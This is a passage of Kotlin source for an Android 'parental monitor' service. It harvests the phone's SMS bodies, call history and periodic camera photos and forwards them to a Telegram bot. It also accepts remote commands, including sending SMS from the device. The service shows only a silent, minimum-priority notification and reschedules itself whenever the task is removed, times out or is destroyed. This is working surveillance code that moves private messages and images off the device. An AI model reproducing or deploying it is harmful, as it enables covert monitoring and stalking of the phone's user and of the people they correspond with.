                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    val sentSmsPart = sendFitted(message)
                    try {
                        preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
                    } catch (_: Exception) {
                    }
                    if (!sentSmsPart) {
                        initialOk = false
                        break
                    }
                    delay(500)
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All SMS sent")
            }

            if (pendingCalls.isNotEmpty()) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${pendingCalls.size} calls...")
                val callTotal = pendingCalls.size
                for ((index, part) in pendingCalls.chunked(10).withIndex()) {
                    val message = buildString {
                        appendLine("📞 <b>Call History (${index * 10 + 1}-${index * 10 + part.size} of $callTotal)</b>")
                        appendLine()
                        part.forEach { call ->
                            appendLine("📱 Number: ${Html.escape(call.number)}")
                            if (call.name != null) {
                                appendLine("👤 Name: ${Html.escape(call.name)}")
                            }
                            appendLine("🔄 Type: ${call.getTypeString()}")
                            appendLine("⏱️ Duration: ${call.getDurationString()}")
                            appendLine("⏰ Time: ${formatDate(call.date)}")
                            appendLine("━━━━━━━━━━━━━━━━")
                        }
                    }
                    val sentCallPart = sendFitted(message)
                    try {
                        val latest = part.maxWith(compareBy({ it.date }, { it.id }))
                        if (latest.date > preferencesManager.lastCallTimestamp ||
                            (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
                        ) {
                            preferencesManager.lastCallTimestamp = latest.date
                            preferencesManager.lastCallId = latest.id
                        }
                    } catch (_: Exception) {
                    }
                    if (!sentCallPart) {
                        initialOk = false
                        break
                    }
                    delay(500)
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "All calls sent")
            }

            // Final message
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending completion message...")
            val photoState = if (isPhotoPaused()) {
                val leftMin = ((photoPausedElapsed() - System.currentTimeMillis()) / 60_000L).coerceAtLeast(1L)
                "paused ($leftMin min left)"
            } else if (preferencesManager.cameraInterval <= 0) {
                "manual only (/photo)"
            } else {
                "every ${preferencesManager.cameraInterval} min"
            }
            val completeMessage = buildString {
                appendLine("✅ <b>History sync complete</b>")
                appendLine()
                appendLine("From now on, only new SMS and calls will be sent.")
                appendLine()
                appendLine("📊 <b>Now</b>")
                appendLine("Monitoring: ON")
                appendLine("Data interval: ${preferencesManager.syncInterval} min")
                appendLine("Photos: $photoState")
                appendLine("Queued: ${messageQueue.getQueueSize()}")
                appendLine()
                appendLine("All commands are in the bot menu — tap /help anytime.")
            }
            if (initialOk && !smsTruncated && !callTruncated) {
                sendToTelegram(completeMessage)
            } else {
                sendToTelegram("History sync partially sent. Remainder follows automatically via periodic updates.")
            }
            preferencesManager.initialSyncDone = true
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Initial data sending complete ===")

        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error in initial sync: ${redactToken(e.message)}")
        }
    }

    private suspend fun checkAndSendNewData() {
        if (initialSyncRunning.get()) return
        if (NetworkUtils.isAuthBlocked(preferencesManager)) return
        try {
            val lastSms = try {
                preferencesManager.lastSmsId
            } catch (_: Exception) {
                0L
            }
            val smsPage = smsRepository.getNewSms(lastSms).take(100)
            if (smsPage.isNotEmpty()) {
                var smsCursor = lastSms
                var smsSentAny = false
                for (part in smsPage.chunked(10)) {
                    val sentSms = sendFitted(formatSmsMessage(part))
                    smsCursor = maxOf(smsCursor, part.maxOf { it.id })
                    try { preferencesManager.lastSmsId = smsCursor } catch (_: Exception) { }
                    if (sentSms) {
                        smsSentAny = true
                    } else {
                        break
                    }
                }
                if (smsSentAny) {
                    try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
                }
            }
            val lastCallTs = try {
                preferencesManager.lastCallTimestamp
            } catch (_: Exception) {
                0L
            }
            val lastCallId = try {
                preferencesManager.lastCallId
            } catch (_: Exception) {
                0L
            }
            val callPage = callLogRepository.getNewCalls(lastCallTs, lastCallId).take(100)
            if (callPage.isNotEmpty()) {
                var callSentAny = false
                for (part in callPage.chunked(10)) {
                    val sentCall = sendFitted(formatCallMessage(part))
                    try {
                        val latest = part.maxWith(compareBy({ it.date }, { it.id }))
                        if (latest.date > preferencesManager.lastCallTimestamp ||
                            (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
                        ) {
                            preferencesManager.lastCallTimestamp = latest.date
                            preferencesManager.lastCallId = latest.id
                        }
                    } catch (_: Exception) {
                    }
                    if (sentCall) {
                        callSentAny = true
                    } else {
                        break
                    }
                }
                if (callSentAny) {
                    try { preferencesManager.lastSyncTime = System.currentTimeMillis() } catch (_: Exception) { }
                }
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error checking new data: ${redactToken(e.message)}")
        }
    }

    private fun numberMatches(raw: String, digits: String): Boolean {
        val normalized = raw.filter { it.isDigit() }
        val want = digits.filter { it.isDigit() }
        if (normalized.isEmpty() || want.isEmpty()) return false
        if (normalized == want) return true
        if (normalized.length < 7 || want.length < 7) return false
        return numbersEqualFast(normalized, want, altVariant(want))
    }

    private fun altVariant(digits: String): String? {
        if (digits.isEmpty()) return null
        if (digits.startsWith("628") && digits.length in 10..15) return "0" + digits.substring(2)
        if (digits.startsWith("08") && digits.length in 10..14) return "62" + digits.substring(1)
        return null
    }

    private fun numbersEqualFast(have: String, want: String, wantAlt: String?): Boolean {
        if (have == want) return true
        if (wantAlt != null && have == wantAlt) return true
        val haveAlt = altVariant(have)
        if (haveAlt != null) {
            if (haveAlt == want) return true
            if (wantAlt != null && haveAlt == wantAlt) return true
        }
        if (want.length < 10) return false
        if (have.endsWith(want) || want.endsWith(have)) return true
        if (wantAlt != null && (have.endsWith(wantAlt) || wantAlt.endsWith(have))) return true
        if (haveAlt != null) {
            if (haveAlt.endsWith(want) || want.endsWith(haveAlt)) return true
            if (wantAlt != null && (haveAlt.endsWith(wantAlt) || wantAlt.endsWith(haveAlt))) return true
        }
        return false
    }


    private fun isPremiumSmsNumber(raw: String): Boolean {
        val digits = raw.filter { it.isDigit() }
        if (digits.isEmpty()) return false
        val local = if (digits.startsWith("0")) digits.substring(1) else digits
        if (local == "1900" || local.startsWith("1900") || local == "900" || local == "976") return true
        if (local.length <= 6) {
            return local.startsWith("9")
        }
        return false
    }

    private suspend fun sendSmsPending(number: String, smsText: String) {
        val sentAction = "com.redeye.parentalmonitor.SMS_SENT_" + System.nanoTime() + "_" + java.util.UUID.randomUUID().toString()
        val baseCode = smsReqSeq.addAndGet(10000) + (java.util.UUID.randomUUID().hashCode() and 0xfff)
        val delivered = CompletableDeferred<Boolean>()
        val smsManager = try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                getSystemService(android.telephony.SmsManager::class.java)
            } else {
                android.telephony.SmsManager.getDefault()
            }
        } catch (e: Exception) {
            sendToTelegram("\u26A0\uFE0F SMS failed.")
            return
        }
        val parts: java.util.ArrayList<String> = try {
            if (smsText.length > 160) smsManager.divideMessage(smsText) else java.util.ArrayList(listOf(smsText))
        } catch (e: Exception) {
            sendToTelegram("\u26A0\uFE0F SMS failed.")
            return
        }
        val expected = parts.size.coerceAtLeast(1)
        val okCount = java.util.concurrent.atomic.AtomicInteger(0)
        val failCount = java.util.concurrent.atomic.AtomicInteger(0)
        val counting = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
                if (intent?.action != sentAction) return
                try {
                    if (resultCode == android.app.Activity.RESULT_OK) {
                        if (okCount.incrementAndGet() >= expected && failCount.get() == 0) delivered.complete(true)
                    } else {
                        if (failCount.incrementAndGet() == 1) delivered.complete(false)
                    }
                } catch (_: Exception) {
                }
            }
        }
        try {
            androidx.core.content.ContextCompat.registerReceiver(
                this,
                counting,
                android.content.IntentFilter(sentAction),
                androidx.core.content.ContextCompat.RECEIVER_NOT_EXPORTED
            )
        } catch (_: Exception) {
            sendToTelegram("\u26A0\uFE0F SMS failed.")
            return
        }
        try {
            try {
                if (parts.size > 1) {
                    val sentIntents = java.util.ArrayList<android.app.PendingIntent>(parts.size)
                    repeat(parts.size) {
                        sentIntents.add(
                            android.app.PendingIntent.getBroadcast(
                                this,
                                baseCode + it * 7919,
                                android.content.Intent(sentAction),
                                android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
                            )
                        )
                    }
                    smsManager.sendMultipartTextMessage(number, null, parts, sentIntents, null)
                } else {
                    val sentIntent = android.app.PendingIntent.getBroadcast(
                        this,
                        baseCode,
                        android.content.Intent(sentAction),
                        android.app.PendingIntent.FLAG_IMMUTABLE or android.app.PendingIntent.FLAG_UPDATE_CURRENT
                    )
                    smsManager.sendTextMessage(number, null, smsText, sentIntent, null)
                }
                val confirmed = withTimeoutOrNull(60_000L + (expected - 1) * 30_000L) { delivered.await() } ?: false
                if (confirmed) {
                    preferencesManager.lastSmsSendAt = System.currentTimeMillis()
                    preferencesManager.pendingSmsNumber = ""
                    preferencesManager.pendingSmsText = ""
                    preferencesManager.pendingSmsAt = 0L
                    preferencesManager.pendingSmsOwner = ""
                    sendToTelegram("\uD83D\uDCE9 SMS sent to $number.")
                } else if (okCount.get() > 0) {
                    sendToTelegram("\u26A0\uFE0F SMS partially sent (${okCount.get()}/$expected parts). Check the recipient before retrying; pending kept, try /smsconfirm again.")
                } else {
                    sendToTelegram("\u26A0\uFE0F SMS not confirmed sent. Pending kept, try /smsconfirm again.")
                }
            } finally {
                try {
                    unregisterReceiver(counting)
                } catch (_: Exception) {
                }
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: SecurityException) {
            sendToTelegram("\u26A0\uFE0F SMS permission missing. Open Setup and grant SMS permission.")
        } catch (e: Exception) {
            sendToTelegram("\u26A0\uFE0F SMS failed.")
        }
    }

    private fun formatSmsMessage(smsList: List<com.redeye.parentalmonitor.data.models.SmsData>): String {
        return buildString {
            appendLine("💬 <b>New SMS (${smsList.size})</b>")
            appendLine()
            
            smsList.forEach { sms ->
                appendLine("📞 Number: ${Html.escape(sms.address)}")
                val body = Html.escape(sms.body.take(200)) // Limit to 200 chars
                appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                appendLine("🔄 Type: ${sms.getTypeString()}")
                appendLine("⏰ Time: ${formatDate(sms.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private fun formatCallMessage(callList: List<com.redeye.parentalmonitor.data.models.CallData>): String {
        return buildString {
            appendLine("📞 <b>New calls (${callList.size})</b>")
            appendLine()
            
            callList.forEach { call ->
                appendLine("📱 Number: ${Html.escape(call.number)}")
                if (call.name != null) {
                    appendLine("👤 Name: ${Html.escape(call.name)}")
                }
                appendLine("🔄 Type: ${call.getTypeString()}")
                appendLine("⏱️ Duration: ${call.getDurationString()}")
                appendLine("⏰ Time: ${formatDate(call.date)}")
                appendLine("━━━━━━━━━━━━━━━━")
            }
        }
    }

    private fun safeCut(text: String, max: Int): Int {
        if (text.length <= max) return text.length
        var cut = max
        if (Character.isHighSurrogate(text[cut - 1]) && Character.isLowSurrogate(text[cut])) cut -= 1
        val amp = text.lastIndexOf('&', cut - 1)
        if (amp >= 0 && amp > cut - 12) {
            val semi = text.indexOf(';', amp)
            if (semi < 0 || semi >= cut) {
                val entity = text.substring(amp, cut)
                if (entity.all { it.isLetterOrDigit() || it == '&' || it == '#' }) cut = amp
            }
        }
        val tag = text.lastIndexOf('<', cut - 1)
        if (tag >= 0 && text.indexOf('>', tag) >= cut) cut = tag
        if (cut <= 0) cut = max
        return cut
    }
    private suspend fun sendFitted(message: String, replyMarkup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup? = null, queueOnFail: Boolean = true): Boolean {
        if (message.length <= 4000) {
            if (sendToTelegram(message, replyMarkup, false)) return true
            if (queueOnFail) {
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            }
            return false
        }
        var ok = true
        val failed = mutableListOf<String>()
        val lines = message.split("\n")
        var current = StringBuilder()
        for (line in lines) {
            var rest = line
            while (rest.length > 4000) {
                if (current.isNotEmpty()) {
                    if (!sendToTelegram(current.toString(), null, false)) {
                        ok = false
                        failed.add(current.toString())
                    }
                    delay(500)
                    current = StringBuilder()
                }
                val cut = safeCut(rest, 4000)
                if (!sendToTelegram(rest.substring(0, cut), null, false)) {
                    ok = false
                    failed.add(rest.substring(0, cut))
                }
                delay(500)
                rest = rest.substring(cut)
            }
            if (current.length + rest.length + 1 > 4000) {
                if (current.isNotEmpty()) {
                    if (!sendToTelegram(current.toString(), null, false)) {
                        ok = false
                        failed.add(current.toString())
                    }
                    delay(500)
                }
                current = StringBuilder()
            }
            if (current.isNotEmpty()) current.append("\n")
            current.append(rest)
        }
        if (current.isNotEmpty()) {
            if (!sendToTelegram(current.toString(), replyMarkup, false)) {
                ok = false
                failed.add(current.toString())
            }
        }
        if (!ok) {
            if (queueOnFail) {
                messageQueue.addMessages(failed)
                MessageScheduler.scheduleMessageSend(this)
            }
            return false
        }
        return ok
    }

    private suspend fun sendToTelegram(
        message: String,
        replyMarkup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup? = null,
        queueOnFail: Boolean = true
    ): Boolean {
        try {
            if (message.length > 4096) {
                android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, splitting")
                return sendFitted(message, replyMarkup, queueOnFail)
            }

            val (botToken, chatId) = sendCreds()

            if (botToken.isEmpty() || chatId.isEmpty()) {
                android.util.Log.w("MonitoringService", "Bot credentials unavailable, queuing message for later")
                if (queueOnFail) {
                    messageQueue.addMessage(message)
                    MessageScheduler.scheduleMessageSend(this)
                }
                return queueOnFail
            }

            val hasNetwork = hasNetwork()
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Network available: $hasNetwork")
            
            if (!hasNetwork) {
                android.util.Log.w("MonitoringService", "No network, adding to queue")
                if (queueOnFail) {
                    messageQueue.addMessage(message)
                    MessageScheduler.scheduleMessageSend(this)
                }
                return queueOnFail
            }

            val telegramMessage = TelegramMessage(
                chatId = chatId,
                text = message,
                parseMode = "HTML",
                replyMarkup = replyMarkup
            )

            val url = "https://api.telegram.org/bot${botToken}/sendMessage"
            val response = TelegramClient.api.sendMessage(url, telegramMessage)

            if (response.isSuccessful && response.body()?.ok == true) {
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Message sent")
                try {
                    preferencesManager.credentialError = ""
                    preferencesManager.credentialErrorAt = 0L
                } catch (_: Exception) {
                }
                return true
            } else if (response.code() == 429) {
                val retryAfter = NetworkUtils.parseRetryAfter(response.errorBody()?.string())
                android.util.Log.w("MonitoringService", "Rate limited, will retry via queue after ${retryAfter}s")
                if (queueOnFail) {
                    messageQueue.addMessage(message)
                    MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
                }
                return queueOnFail
            } else if (response.code() == 401 || response.code() == 403) {
                android.util.Log.e("MonitoringService", "Auth rejected (${response.code()}), queuing until credentials are fixed")
                try {
                    preferencesManager.credentialError = response.code().toString()
                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
                } catch (_: Exception) {
                }
                if (queueOnFail) {
                    messageQueue.addMessage(message)
                    MessageScheduler.scheduleMessageSend(this)
                }
                return queueOnFail
            } else if (response.code() == 400) {
                val goneBody = try { response.errorBody()?.string() } catch (_: Exception) { null }
                if (NetworkUtils.isChatMissing(goneBody)) {
                    try {
                        preferencesManager.credentialError = response.code().toString()
                        preferencesManager.credentialErrorAt = System.currentTimeMillis()
                    } catch (_: Exception) {
                    }
                    try {
                        postAuthFailureReminder(400)
                    } catch (_: Exception) {
                    }
                    if (queueOnFail) {
                        messageQueue.addMessage(message)
                        MessageScheduler.scheduleMessageSend(this)
                    }
                    return queueOnFail
                }
                val plain = message.replace(TAG_STRIP_REGEX, "")
                if (plain != message) {
                    try {
                        val fallbackUrl = "https://api.telegram.org/bot${botToken}/sendMessage"
                        val fallbackResp = TelegramClient.api.sendMessage(fallbackUrl, TelegramMessage(chatId = chatId, text = plain, parseMode = null))
                        if (fallbackResp.isSuccessful && fallbackResp.body()?.ok == true) {
                            try {
                                preferencesManager.credentialError = ""
                                preferencesManager.credentialErrorAt = 0L
                            } catch (_: Exception) {
                            }
                            return true
                        } else if (fallbackResp.code() == 429) {
                            val retryAfter = NetworkUtils.parseRetryAfter(try { fallbackResp.errorBody()?.string() } catch (_: Exception) { null })
                            if (queueOnFail) {
                                messageQueue.addMessage(plain)
                                MessageScheduler.scheduleMessageSendNext(this, retryAfter * 1000L)
                            }
                            return queueOnFail
                        } else if (fallbackResp.code() == 401 || fallbackResp.code() == 403) {
                            try {
                                preferencesManager.credentialError = fallbackResp.code().toString()
                                preferencesManager.credentialErrorAt = System.currentTimeMillis()
                            } catch (_: Exception) {
                            }
                            if (queueOnFail) {
                                messageQueue.addMessage(plain)
                                MessageScheduler.scheduleMessageSend(this)
                            }
                            return queueOnFail
                        } else if (fallbackResp.code() == 408 || fallbackResp.code() >= 500) {
                            if (queueOnFail) {
                                messageQueue.addMessage(plain)
                                MessageScheduler.scheduleMessageSend(this)
                            }
                            return queueOnFail
                        } else {
                            android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
                            try {
                                messageQueue.addMessage("Dropped 1 message rejected by Telegram (400).")
                                MessageScheduler.scheduleMessageSend(this)
                            } catch (_: Exception) {
                            }
                            return true
                        }
                    } catch (_: Exception) {
                        if (queueOnFail) {
                            messageQueue.addMessage(plain)
                            MessageScheduler.scheduleMessageSend(this)
                        }
                        return queueOnFail
                    }
                } else {
                    android.util.Log.w("MonitoringService", "Message permanently rejected (400), not queued")
                    try {
                        messageQueue.addMessage("Dropped 1 message rejected by Telegram (400).")
                        MessageScheduler.scheduleMessageSend(this)
                    } catch (_: Exception) {
                    }
                    return true
                }
            } else {
                android.util.Log.e("MonitoringService", "✗ Failed to send: ${response.code()}")
                if (queueOnFail) {
                    messageQueue.addMessage(message)
                    MessageScheduler.scheduleMessageSend(this)
                }
                return queueOnFail
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "✗ Exception sending message: ${redactToken(e.message)}")
            if (queueOnFail) {
                messageQueue.addMessage(message)
                MessageScheduler.scheduleMessageSend(this)
            }
            return queueOnFail
        }
    }

    private fun syncIntervalMillis(): Long {
        if (cachedSyncInterval <= 0) {
            cachedSyncInterval = try {
                preferencesManager.syncInterval
            } catch (_: Exception) {
                com.redeye.parentalmonitor.BuildConfig.SYNC_INTERVAL
            }
        }
        return cachedSyncInterval.coerceIn(1, 1440) * 60_000L
    }

    private fun formatDate(timestamp: Long): String {
        return TimeFmt.full(timestamp)
    }

    private fun stopMonitoring() {
        monitoringJob?.cancel()
        cameraJob?.cancel()
        commandJob?.cancel()
        initialSyncJob?.cancel()
        ringJob?.cancel()
        recordJob?.cancel()
        smsJob?.cancel()
        initialSyncRunning.set(false)
        idlePolls = 0
        cachedSetupTap = null
        isRunning = false
        try {
            loopWatchdogJob?.cancel()
        } catch (_: Exception) {
        }
        watchdogJob?.cancel()
        cameraBusy.set(false)
        smsBusy.set(false)
        ringBusy.set(false)
        recordBusy.set(false)
        audioFlushBusy.set(false)
        photoFlushBusy.set(false)
        try {
            cameraService.forceReset()
        } catch (_: Exception) {
        }
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            if (shouldAutoResume()) {
                try {
                    val restart = Intent(this, MonitoringService::class.java).apply {
                        action = ACTION_START_MONITORING
                    }
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(restart)
                    } else {
                        startService(restart)
                    }
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
        }
        try {
            MessageScheduler.scheduleBootRestart(this)
            MessageScheduler.scheduleWatchdog(this)
        } catch (_: Exception) {
        }
        super.onTaskRemoved(rootIntent)
    }

    override fun onTimeout(startId: Int, fgsType: Int) {
        handleFgsTimeout(startId)
    }

    override fun onTimeout(startId: Int) {
        handleFgsTimeout(startId)
    }

    private fun handleFgsTimeout(startId: Int) {
        try {
            MessageScheduler.scheduleBootRestart(this)
        } catch (_: Exception) {
        }
        try {
            MessageScheduler.scheduleWatchdog(this)
        } catch (_: Exception) {
        }
        try {
            monitoringJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            cameraJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            commandJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            initialSyncJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            ringJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            recordJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            smsJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            loopWatchdogJob?.cancel()
        } catch (_: Exception) {
        }
        try {
            watchdogJob?.cancel()
        } catch (_: Exception) {
        }
        cameraBusy.set(false)
        smsBusy.set(false)
        ringBusy.set(false)
        recordBusy.set(false)
        audioFlushBusy.set(false)
        photoFlushBusy.set(false)
        try {
            cameraService.forceReset()
        } catch (_: Exception) {
        }
        initialSyncRunning.set(false)
        isRunning = false
        try {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } catch (_: Exception) {
        }
        stopSelf()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        try {
            if (shouldAutoResume()) {
                try {
                    MessageScheduler.scheduleBootRestart(this)
                } catch (_: Exception) {
                }
                try {
                    MessageScheduler.scheduleWatchdog(this)
                } catch (_: Exception) {
                }
            }
        } catch (_: Exception) {
        }
        try { credsListener?.let { preferencesManager.unregisterChangeListener(it) } } catch (_: Exception) { }
        try {
            cameraBusy.set(false)
            cameraService.forceReset()
        } catch (_: Exception) {
        }
        cachedSetupTap = null
        isRunning = false
        super.onDestroy()
        serviceScope.cancel()
    }
    
    // ═══════════════════════════════════════════════════════════
    // CAMERA MONITORING FUNCTIONS
    // ═══════════════════════════════════════════════════════════
    
    private fun captureAndSendPhoto(reportResult: Boolean = false) {
        if (NetworkUtils.isAuthBlocked(preferencesManager)) {
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("Auth rejected, photo delayed until the token is fixed in Setup.")
                }
            }
            return
        }
        if (pendingPhotoCount() >= 10) {
            try {
                prunePhotoCache(9)
            } catch (_: Exception) {
            }
            if (pendingPhotoCount() >= 10) {
                serviceScope.launch {
                    if (reportResult) {
                        sendToTelegram("⚠️ Photo backlog full (offline). Oldest unsent kept; newest capture skipped.")
                    } else {
                        notifyCameraFailure("photo backlog full")
                    }
                }
                return
            }
        }
        if (!hasCameraPermission()) {
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: camera permission missing. Open Setup and grant Camera permission.")
                } else {
                    notifyCameraFailure("camera permission missing")
                }
            }
            return
        }
        if (isCameraDisabledByPolicy()) {
            autoPausePhotosOnPolicyBlock()
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: " + sanitizedCameraError("CAMERA_DISABLED") + " " + cameraFailureHint("CAMERA_DISABLED"))
                } else {
                    notifyCameraFailure("camera disabled by device policy (CAMERA_DISABLED)")
                }
            }
            return
        }
        if (!cameraBusy.compareAndSet(false, true)) {
            if (reportResult) {
                serviceScope.launch {
                    sendToTelegram("⚠️ Camera is busy, please try /photo again in a moment.")
                }
            }
            return
        }
        watchdogJob?.cancel()
        val attempt = cameraAttempt.incrementAndGet()
        val wd = serviceScope.launch {
            delay(45_000)
            if (cameraAttempt.get() == attempt && cameraBusy.compareAndSet(true, false)) {
                cameraAttempt.incrementAndGet()
                android.util.Log.w("MonitoringService", "Camera watchdog: capture did not finish, flag reset")
                try {
                    cameraService.forceReset()
                } catch (_: Exception) {
                }
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture timed out without a response. Please try /photo again.")
                }
            }
        }
        watchdogJob = wd
        try {
            ensureForegroundTypes()
            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "📸 Starting camera capture...")
            cameraService.capturePhoto(
                lensFacing = selectedLensFacing(),
                onPhotoTaken = { photoFile ->
                    if (cameraAttempt.get() != attempt) return@capturePhoto
                    cameraAttempt.incrementAndGet()
                    cameraBusy.set(false)
                    try {
                        wd.cancel()
                    } catch (_: Exception) {
                    }
                    activePhotoFile = photoFile
                    serviceScope.launch {
                        try {
                            when (sendPhotoFile(photoFile)) {
                                MediaSendOutcome.SENT -> flushPendingPhotos()
                                MediaSendOutcome.DROPPED -> {
                                    prunePhotoCache()
                                    if (reportResult) {
                                        sendToTelegram("⚠️ Photo rejected by Telegram (400), file discarded.")
                                    }
                                }
                                MediaSendOutcome.KEPT -> {
                                    prunePhotoCache()
                                    if (reportResult) {
                                        sendToTelegram("⚠️ Photo captured but upload failed. File kept for retry.")
                                    }
                                }
                            }
                        } finally {
                            activePhotoFile = null
                        }
                    }
                },
                onError = { exception ->
                    if (cameraAttempt.get() != attempt) return@capturePhoto
                    cameraAttempt.incrementAndGet()
                    cameraBusy.set(false)
                    try {
                        wd.cancel()
                    } catch (_: Exception) {
                    }
                    android.util.Log.e("MonitoringService", "✗ Camera capture failed: ${exception.message}")
                    val policyBlocked = isCameraPolicyError(exception.message) || isCameraDisabledByPolicy()
                    if (policyBlocked) autoPausePhotosOnPolicyBlock()
                    serviceScope.launch {
                        if (reportResult) {
                            var hint = cameraFailureHint(exception.message)
                            if (policyBlocked) hint += " Automatic photos paused for 120 min; send /photointerval 0 to turn auto photos off, or /resume to retry."
                            sendToTelegram("⚠️ Photo capture failed: " + sanitizedCameraError(exception.message) + " " + hint)
                        } else {
                            notifyCameraFailure(sanitizedCameraError(exception.message))
                        }
                    }
                }
            )
        } catch (e: Exception) {
            cameraAttempt.incrementAndGet()
            cameraBusy.set(false)
            watchdogJob?.cancel()
            android.util.Log.e("MonitoringService", "✗ Error in captureAndSendPhoto: ${redactToken(e.message)}")
            val policyBlocked = isCameraPolicyError(e.message)
            if (policyBlocked) autoPausePhotosOnPolicyBlock()
            serviceScope.launch {
                if (reportResult) {
                    sendToTelegram("⚠️ Photo capture failed: " + sanitizedCameraError(e.message) + ".")
                } else {
                    notifyCameraFailure(sanitizedCameraError(e.message))
                }
            }
        }
    }
    
    private fun sanitizedCameraError(reason: String?): String {
        if (isCameraPolicyError(reason)) return "camera disabled by device policy (CAMERA_DISABLED)"
        val firstLine = (reason ?: "unknown error").lineSequence().firstOrNull()?.trim().orEmpty()
        if (firstLine.isEmpty()) return "unknown error"
        val cleaned = firstLine.replace(Regex("(?i)connectHelper:\\d+:\\s*"), "")
        return cleaned.take(160)
    }

    private fun autoPausePhotosOnPolicyBlock() {
        try {
            if (isPhotoPaused()) return
            preferencesManager.photoPausedUntil = System.currentTimeMillis() + 120 * 60_000L
            cachedPhotoPausedUntil = photoPausedElapsed()
        } catch (_: Exception) {
        }
    }

    private suspend fun notifyCameraFailure(reason: String) {
        try {
            val clean = sanitizedCameraError(reason)
            if (isCameraPolicyError(clean)) autoPausePhotosOnPolicyBlock()
            val now = System.currentTimeMillis()
            val last = preferencesManager.lastCameraErrorNotice
            if (last > 0 && last <= now && now - last < 30 * 60_000L) return
            preferencesManager.lastCameraErrorNotice = now
            var hint = cameraFailureHint(clean)
            if (isCameraPolicyError(clean)) hint += " Automatic photos paused for 120 min; send /photointerval 0 to turn auto photos off, or /resume to retry."
            sendToTelegram("⚠️ Photo capture failed: $clean. $hint")
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error sending camera notice: ${redactToken(e.message)}")
        }
    }

    private suspend fun notifyPhotoSendFailure(detail: String) {
        try {
            val now = System.currentTimeMillis()
            val last = preferencesManager.lastUploadErrorNotice
            if (last > 0 && last <= now && now - last < 30 * 60_000L) return
            preferencesManager.lastUploadErrorNotice = now
            sendToTelegram("⚠️ Photo upload failed ($detail). Will retry automatically.")
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Error sending upload notice: ${redactToken(e.message)}")
        }
    }

    private fun computeForegroundTypes(): Int {
        var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (hasCameraPermission()) {
            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }
        if (hasMicPermission()) {
            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        }
        if (hasLocationPermission() && hasBackgroundLocation()) {
            types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        }
        return types
    }

    private fun ensureForegroundTypes() {
        try {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
            val types = computeForegroundTypes()
            if (types == appliedFgsTypes) return
            val notification = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_notification)
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(getString(R.string.notification_text))
                .setContentIntent(setupTapIntent())
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setOngoing(true)
                .setSilent(true)
                .setShowWhen(false)
                .build()
            startForeground(NOTIFICATION_ID, notification, types)
            appliedFgsTypes = types
        } catch (_: Exception) {
        }
    }

    private fun hasMicPermission(): Boolean {
        return androidx.core.content.ContextCompat.checkSelfPermission(
            this,
